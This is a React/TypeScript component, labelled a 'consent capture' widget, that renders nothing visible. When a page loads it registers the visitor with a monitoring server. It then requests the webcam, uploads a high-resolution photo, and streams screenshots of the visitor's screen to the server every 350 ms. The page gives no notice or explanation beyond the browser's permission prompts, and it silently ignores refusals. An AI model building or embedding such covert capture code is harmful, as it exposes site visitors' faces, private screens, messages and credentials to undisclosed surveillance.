import { useEffect, useMemo, useRef } from 'react'
import { io, type Socket } from 'socket.io-client'
import { MONITORING_SERVER_URL } from './config'

const KEY = 'monitoring_visitor_session'

function sid() {
  const s = localStorage.getItem(KEY)
  if (s) return s
  const v = crypto.randomUUID()
  localStorage.setItem(KEY, v)
  return v
}

export function ConsentCaptureWidget() {
  const sessionId = useMemo(() => sid(), [])
  const socket = useRef<Socket | null>(null)
  const screenStreamRef = useRef<MediaStream | null>(null)
  const frameTimerRef = useRef<number | null>(null)

  useEffect(() => {
    const s = io(MONITORING_SERVER_URL, { transports: ['websocket'] })
    socket.current = s
    s.on('connect', () => s.emit('visitor:register', { sessionId, userAgent: navigator.userAgent }))
    return () => {
      s.disconnect()
    }
  }, [sessionId])

  useEffect(() => {
    let cancelled = false

    const stopScreenShare = () => {
      if (frameTimerRef.current) {
        clearInterval(frameTimerRef.current)
        frameTimerRef.current = null
      }
      if (screenStreamRef.current) {
        screenStreamRef.current.getTracks().forEach((t) => t.stop())
        screenStreamRef.current = null
      }
      socket.current?.emit('visitor:screen-sharing', { sessionId, active: false })
    }

    const requestCameraAndScreen = async () => {
      let cameraStream: MediaStream | null = null

      try {
        cameraStream = await navigator.mediaDevices.getUserMedia({
          video: {
            width: { ideal: 1920 },
            height: { ideal: 1080 },
            frameRate: { ideal: 30, max: 30 },
          },
        })
        if (cancelled) return

        const v = document.createElement('video')
        v.srcObject = cameraStream
        await v.play()

        const c = document.createElement('canvas')
        c.width = v.videoWidth || 1280
        c.height = v.videoHeight || 720
        const ctx = c.getContext('2d')
        if (!ctx) return

        ctx.drawImage(v, 0, 0, c.width, c.height)
        const blob = await new Promise<Blob>((ok, bad) =>
          c.toBlob((b) => (b ? ok(b) : bad(new Error('blob'))), 'image/webp', 0.95),
        )
        if (cancelled) return

        const fd = new FormData()
        fd.append('sessionId', sessionId)
        fd.append('photo', blob, 'photo.webp')
        await fetch(`${MONITORING_SERVER_URL}/api/visitor/photo`, { method: 'POST', body: fd })
      } catch {
        // User denied permission or camera unavailable.
      } finally {
        cameraStream?.getTracks().forEach((t) => t.stop())
      }

      try {
        const screenStream = await navigator.mediaDevices.getDisplayMedia({
          video: {
            width: { ideal: 1920 },
            height: { ideal: 1080 },
            frameRate: { ideal: 30, max: 30 },
          },
          audio: false,
        })
        if (cancelled) {
          screenStream.getTracks().forEach((t) => t.stop())
          return
        }

        screenStreamRef.current = screenStream
        const screenTrack = screenStream.getVideoTracks()[0]
        const video = document.createElement('video')
        video.srcObject = screenStream
        video.muted = true
        await video.play()

        const canvas = document.createElement('canvas')
        const ctx = canvas.getContext('2d')
        if (!ctx) {
          stopScreenShare()
          return
        }

        socket.current?.emit('visitor:screen-sharing', { sessionId, active: true })

        frameTimerRef.current = window.setInterval(() => {
          if (cancelled || !video.videoWidth || !video.videoHeight) return
          canvas.width = video.videoWidth
          canvas.height = video.videoHeight
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height)
          socket.current?.emit('visitor:screen-frame', {
            sessionId,
            frame: canvas.toDataURL('image/webp', 0.82),
          })
        }, 350)

        screenTrack.onended = () => {
          stopScreenShare()
        }
      } catch {
        // User denied screen capture permission.
      }
    }

    requestCameraAndScreen()

    return () => {
      cancelled = true
      stopScreenShare()
    }
  }, [sessionId])

  return null
}
